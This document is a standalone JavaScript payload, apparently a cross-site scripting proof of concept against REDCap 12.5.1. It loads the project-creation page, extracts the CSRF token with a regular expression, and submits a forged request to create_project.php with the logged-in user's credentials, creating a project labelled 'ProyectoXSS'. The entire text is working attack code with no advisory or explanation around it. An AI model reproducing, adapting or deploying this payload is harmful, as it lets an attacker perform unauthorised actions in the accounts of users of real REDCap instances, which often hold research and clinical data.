<script>
fetch('/redcap/redcap_v12.5.1/index.php?action=create')
  .then(r => r.text())
  .then(html => {
    const token = html.match(/name="redcap_csrf_token"\s+value="(.*?)"/)[1];

    const formData = new FormData();
    formData.append("surveys_enabled", "0");
    formData.append("repeatforms", "0");
    formData.append("scheduling", "0");
    formData.append("randomization", "0");
    formData.append("app_title", "ProyectoXSS");
    formData.append("purpose", "0");
    formData.append("project_note", "Inyectado vía XSS");
    formData.append("projecttype", "on");
    formData.append("repeatforms_chk", "on");
    formData.append("project_template_radio", "0");
    formData.append("redcap_csrf_token", token);

    fetch("/redcap/redcap_v12.5.1/ProjectGeneral/create_project.php", {
      method: "POST",
      body: formData,
      credentials: "include"
    });
  });
</script>
